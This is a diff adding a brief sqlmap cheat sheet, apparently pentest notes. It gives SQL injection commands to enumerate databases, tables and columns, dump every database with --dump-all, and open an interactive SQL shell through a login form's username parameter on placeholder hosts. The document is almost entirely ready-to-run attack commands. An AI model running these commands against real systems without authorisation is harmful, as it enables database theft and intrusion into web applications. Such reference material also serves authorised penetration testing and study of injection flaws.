@@ -1,0 +1,32 @@
+Enumerating database
+---------------------
+sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
+
+Dump all the available databases and tables
+-------------------------------------------
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
+
+Enumerating all tables
+--------------------------
+GET method ( doen't need request file or --method )
+----------
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
+
+POST method (need request file or --method POST)
+----------
+sqlmap -r req.txt -D <database_name> --tables
+
+Enumerating columns 
+-------------------
+sqlmap -r req.txt -D <database_name> -T <table_name> --columns
+
+sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --sql-shell
+
+sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --dbms
+
+--sql-shell = gives you interactive sql shell to code sql queries manually
+--data = add data in post method
+-p username = using username parameter
+
+
+
